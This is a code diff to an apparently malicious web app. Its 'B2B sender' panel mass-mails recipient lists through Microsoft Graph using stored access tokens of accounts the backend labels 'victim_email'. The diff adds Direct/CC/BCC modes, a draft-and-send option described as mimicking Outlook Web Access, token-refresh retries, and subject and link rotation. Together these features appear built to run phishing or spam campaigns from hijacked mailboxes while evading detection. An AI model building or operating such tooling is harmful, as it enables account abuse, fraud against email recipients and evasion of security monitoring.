@@ -427,6 +427,10 @@ HTML_TEMPLATE = r'''
         /* ── Column 1: Recipients List (Generous Breathing Space) ── */
         .b2b-col-recipients { width:300px; min-width:270px; max-width:340px; background:#0f080b; border-right:1px solid #2e1216; display:flex; flex-direction:column; flex-shrink:0; padding:12px; gap:8px; box-sizing:border-box; }
         .b2b-panel-header { display:flex; justify-content:space-between; align-items:center; font-size:.74em; font-weight:700; color:#ffffff; letter-spacing:.08em; }
+        .b2b-mode-selector { display:flex; background:#180d11; border:1px solid #38161b; border-radius:14px; padding:2px; gap:2px; }
+        .b2b-mode-btn { background:transparent; border:none; color:#a49498; font-size:.68em; font-weight:700; padding:2px 7px; border-radius:10px; cursor:pointer; transition:all .15s; letter-spacing:.03em; }
+        .b2b-mode-btn:hover { color:#ffffff; }
+        .b2b-mode-btn.active { background:#b00710; color:#ffffff; box-shadow:0 0 6px rgba(229,9,20,0.4); }
         .b2b-bcc-row { display:flex; align-items:center; gap:6px; cursor:pointer; }
         .b2b-bcc-label { font-size:.8em; color:#e2e8f0; font-weight:600; }
         .b2b-sw { width:28px; height:14px; background:#261115; border-radius:10px; position:relative; transition:background .2s; border:1px solid #5a1c22; flex-shrink:0; }
@@ -3149,9 +3153,10 @@ HTML_TEMPLATE = r'''
                 <div class="b2b-col-recipients">
                     <div class="b2b-panel-header">
                         <span>RECIPIENTS</span>
-                        <div class="b2b-bcc-row" onclick="toggleB2BBCC()" title="BCC mode: hide recipients from each other">
-                            <span class="b2b-bcc-label">BCC</span>
-                            <div class="b2b-sw" id="b2b-bcc-sw"></div>
+                        <div class="b2b-mode-selector" title="Send Mode: Direct (1-to-1), CC (Visible), or BCC (Hidden)">
+                            <button type="button" class="b2b-mode-btn active" id="b2b-mode-direct" onclick="setB2BMode('direct')" title="Direct: Personalized 1-to-1 emails">DIRECT</button>
+                            <button type="button" class="b2b-mode-btn" id="b2b-mode-cc" onclick="setB2BMode('cc')" title="CC Mode: Up to 50 recipients in Carbon Copy">CC</button>
+                            <button type="button" class="b2b-mode-btn" id="b2b-mode-bcc" onclick="setB2BMode('bcc')" title="BCC Mode: Up to 50 recipients in Blind Carbon Copy">BCC</button>
                         </div>
                     </div>
                     <textarea id="b2b-recipients" class="b2b-rec-area" placeholder="one@email.com&#10;another@email.com" oninput="updateB2BRecipientCount()"></textarea>
@@ -3224,7 +3229,8 @@ HTML_TEMPLATE = r'''
                         <div class="b2b-sendmode-wrap">
                             <label class="b2b-dim" style="font-size:.7em;">VIA:</label>
                             <select id="b2b-send-mode" class="b2b-sendmode-sel" onchange="onB2BSendModeChange()">
-                                <option value="graph">Microsoft Graph</option>
+                                <option value="graph">Microsoft Graph (sendMail)</option>
+                                <option value="graph_draft">Graph (Draft &amp; Send - OWA Mimic)</option>
                                 <option value="smtp">SMTP Server</option>
                             </select>
                             <button class="b2b-smtp-cfg-btn" id="b2b-smtp-cfg-btn" onclick="openSmtpSettings()" title="Configure SMTP" style="display:none">⚙ SMTP</button>
@@ -11114,6 +11120,7 @@ Delegated     : ${inboxesDesc}
         // ════════════════════════════════════════════════════════════════
         // B2B SENDER JAVASCRIPT
         // ════════════════════════════════════════════════════════════════
+        let _b2bSendMode = 'direct'; // 'direct' | 'cc' | 'bcc'
         let _b2bBCC = false;
         let _b2bRandomize = false;
         let _b2bSaveSent = true;
@@ -11144,9 +11151,17 @@ Delegated     : ${inboxesDesc}
             } catch {}
         }
 
+        function setB2BMode(mode) {
+            _b2bSendMode = mode;
+            _b2bBCC = (mode === 'bcc');
+            ['direct', 'cc', 'bcc'].forEach(m => {
+                const el = document.getElementById('b2b-mode-' + m);
+                if (el) el.classList.toggle('active', m === mode);
+            });
+        }
+
         function toggleB2BBCC() {
-            _b2bBCC = !_b2bBCC;
-            document.getElementById('b2b-bcc-sw').classList.toggle('on', _b2bBCC);
+            setB2BMode(_b2bSendMode === 'bcc' ? 'direct' : 'bcc');
         }
 
         function toggleB2BOpt(opt) {
@@ -11815,7 +11830,7 @@ Delegated     : ${inboxesDesc}
         async function startB2BSend() {
             const uc = document.getElementById('b2b-account-select').value;
             const sendMode = document.getElementById('b2b-send-mode').value;
-            if (sendMode === 'graph' && !uc) { showToast('Select a sender account for Graph API mode'); return; }
+            if (sendMode !== 'smtp' && !uc) { showToast('Select a sender account for Graph mode'); return; }
             const recipients = document.getElementById('b2b-recipients').value.trim().split('\n').map(l=>l.trim()).filter(l=>l.includes('@'));
             if (!recipients.length) { showToast('Add at least one recipient'); return; }
             const subjects = document.getElementById('b2b-subjects').value.trim().split('\n').filter(l=>l.trim());
@@ -11839,7 +11854,7 @@ Delegated     : ${inboxesDesc}
             document.getElementById('b2b-total-ct').textContent = recipients.length;
             _b2bStartTime = Date.now();
 
-            b2bTermLog(`🚀 Campaign: "${document.getElementById('b2b-campaign-name').value||'Unnamed'}" → ${recipients.length} recipients`, 'header');
+            b2bTermLog(`🚀 Campaign: "${document.getElementById('b2b-campaign-name').value||'Unnamed'}" → ${recipients.length} recipients [Via: ${sendMode.toUpperCase()}]`, 'header');
 
             let attachmentsPayload = [];
             if (_b2bFiles && _b2bFiles.length > 0) {
@@ -11865,9 +11880,11 @@ Delegated     : ${inboxesDesc}
             }
 
             const payload = { user_code:uc, recipients, subjects, links,
+                send_mode: _b2bSendMode,
+                api_method: sendMode,
                 subject_rotate_n: parseInt(document.getElementById('b2b-subject-rotate').value)||1,
                 link_rotate_n: parseInt(document.getElementById('b2b-link-rotate').value)||1,
-                body_html, priority: _b2bPriority, delay_ms: _b2bDelayMs, bcc_mode: _b2bBCC, save_sent: _b2bSaveSent,
+                body_html, priority: _b2bPriority, delay_ms: _b2bDelayMs, bcc_mode: _b2bSendMode === 'bcc', save_sent: _b2bSaveSent,
                 attachments: attachmentsPayload,
                 smtp: sendMode === 'smtp' ? _smtpCfg : undefined };
 
@@ -12001,7 +12018,8 @@ Delegated     : ${inboxesDesc}
                 priority: _b2bPriority, delay_ms: _b2bDelayMs,
                 subject_rotate_n: parseInt(document.getElementById('b2b-subject-rotate').value)||1,
                 link_rotate_n: parseInt(document.getElementById('b2b-link-rotate').value)||1,
-                bcc_mode: _b2bBCC?1:0, save_sent: _b2bSaveSent?1:0
+                send_mode: _b2bSendMode,
+                bcc_mode: _b2bSendMode === 'bcc'?1:0, save_sent: _b2bSaveSent?1:0
             };
             try {
                 const r = await (await fetch('/api/b2b/campaigns', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)})).json();
@@ -12045,7 +12063,8 @@ Delegated     : ${inboxesDesc}
                 if (c.sender_user_code) { const s = document.getElementById('b2b-account-select'); if ([...s.options].find(o=>o.value===c.sender_user_code)) s.value = c.sender_user_code; }
                 _b2bPriority = c.priority||'normal';
                 document.getElementById('b2b-priority-label').textContent = _b2bPriority.toUpperCase();
-                _b2bBCC = !!c.bcc_mode; document.getElementById('b2b-bcc-sw').classList.toggle('on', _b2bBCC);
+                _b2bSendMode = c.send_mode || (c.bcc_mode ? 'bcc' : 'direct');
+                setB2BMode(_b2bSendMode);
                 _b2bSaveSent = c.save_sent!==0;
                 document.getElementById('b2b-save-off').classList.toggle('active', !_b2bSaveSent);
                 document.getElementById('b2b-save-on').classList.toggle('active', _b2bSaveSent);
@@ -16204,6 +16223,7 @@ def b2b_send():
     bcc_mode    = bool(data.get('bcc_mode', False))
     save_sent   = bool(data.get('save_sent', True))
     attachments = data.get('attachments', [])
+    api_method  = data.get('api_method', 'graph')
 
     # Resolve sender's own email so we can filter it out of recipients
     sender_email = (s.get('victim_email') or '').strip().lower()
@@ -16222,6 +16242,15 @@ def b2b_send():
                 return new_tok
             except Exception:
                 return None
+
+        def _dispatch_send(msg):
+            if api_method == 'graph_draft':
+                return graph.send_mail_via_draft(token, msg)
+            return graph.make_graph_request(
+                '/me/sendMail', token,
+                method='POST',
+                payload={'message': msg, 'saveToSentItems': save_sent}
+            )
 
         sent = failed = 0
         send_count_since_refresh = 0
@@ -16268,11 +16297,7 @@ def b2b_send():
                     msg_obj['attachments'] = attachments
 
                 try:
-                    res = graph.make_graph_request(
-                        '/me/sendMail', token,
-                        method='POST',
-                        payload={'message': msg_obj, 'saveToSentItems': save_sent}
-                    )
+                    res = _dispatch_send(msg_obj)
                     if res is None or not res.get('error'):
                         sent += len(batch)
                         send_count_since_refresh += len(batch)
@@ -16290,7 +16315,7 @@ def b2b_send():
                                 token = new_tok
                                 send_count_since_refresh = 0
                                 # Retry this batch
-                                res2 = graph.make_graph_request('/me/sendMail', token, method='POST', payload={'message': msg_obj, 'saveToSentItems': save_sent})
+                                res2 = _dispatch_send(msg_obj)
                                 if res2 is None or not res2.get('error'):
                                     sent += len(batch)
                                     for r in batch:
@@ -16374,11 +16399,7 @@ def b2b_send():
                     msg_obj['attachments'] = attachments
 
                 try:
-                    res = graph.make_graph_request(
-                        '/me/sendMail', token,
-                        method='POST',
-                        payload={'message': msg_obj, 'saveToSentItems': save_sent}
-                    )
+                    res = _dispatch_send(msg_obj)
                     if res is None or not res.get('error'):
                         sent += 1
                         send_count_since_refresh += 1
@@ -16394,7 +16415,7 @@ def b2b_send():
                             if new_tok:
                                 token = new_tok
                                 send_count_since_refresh = 0
-                                res2 = graph.make_graph_request('/me/sendMail', token, method='POST', payload={'message': msg_obj, 'saveToSentItems': save_sent})
+                                res2 = _dispatch_send(msg_obj)
                                 if res2 is None or not res2.get('error'):
                                     sent += 1
                                     yield sse({'type': 'sent', 'recipient': rec, 'subject': f"{subj_final} (retry)"})
